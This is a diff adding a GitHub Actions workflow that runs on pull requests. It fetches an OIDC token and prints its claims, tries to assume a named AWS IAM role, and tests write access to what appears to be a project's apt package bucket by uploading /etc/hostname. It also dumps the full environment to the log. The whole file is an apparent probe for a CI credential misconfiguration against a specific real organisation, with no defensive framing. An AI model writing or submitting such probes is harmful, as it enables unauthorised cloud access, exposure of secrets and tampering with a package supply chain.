@@ -1,0 +1,30 @@
+name: w5 oidc probe
+on:
+  pull_request:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: claims
+        run: |
+          echo "repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME ref=$GITHUB_REF"
+          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
+          echo "$TOK" | cut -d. -f2 | base64 -d 2>/dev/null || true
+          echo
+      - name: assume
+        id: assume
+        continue-on-error: true
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::962042992619:role/chainflip-github-bot
+          aws-region: eu-central-1
+      - name: identity and write probe
+        run: |
+          aws sts get-caller-identity || true
+          aws s3api put-object --bucket apt.aws.chainflip.xyz --key w5probe/oidc.txt --body /etc/hostname && echo PUT_OK || echo PUT_FAIL
+          aws s3api list-objects-v2 --bucket apt.aws.chainflip.xyz --prefix w5probe/ --max-items 5 || true
+      - name: env
+        run: env | sort
